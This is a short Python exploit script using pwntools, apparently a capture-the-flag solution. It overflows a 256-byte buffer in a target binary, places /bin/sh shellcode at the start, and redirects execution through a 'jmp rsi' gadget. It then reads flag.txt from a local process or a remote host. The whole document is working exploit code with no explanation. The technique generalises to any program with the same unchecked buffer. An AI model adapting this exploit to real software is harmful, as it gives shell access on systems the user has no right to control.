from pwn import *
import sys

context.update(arch='amd64', os='linux')

if (len(sys.argv) < 2):
	print("""
Usage (local): ./exploit.py local <filename>
Usage (remote): ./exploit.py remote <filename> <host> <port>
""")
	sys.exit()

filename = sys.argv[2]

binary = ELF(filename)

jmp_rsi = asm('jmp rsi')

jmp_rsi_addr = next(binary.search(jmp_rsi))

shellcode = asm(shellcraft.sh())

buffer = b"A" * (256 - len(shellcode))

payload = shellcode + buffer + p64(jmp_rsi_addr)

if (sys.argv[1] == "remote"):
	io = connect(sys.argv[3], sys.argv[4])
	
else:
	io = process(filename)


io.recvline()
io.send(payload)

io.clean()
io.sendline(b'cat flag.txt')
warning('Flag: ' + io.recv().decode('utf-8'))

#io.interactive()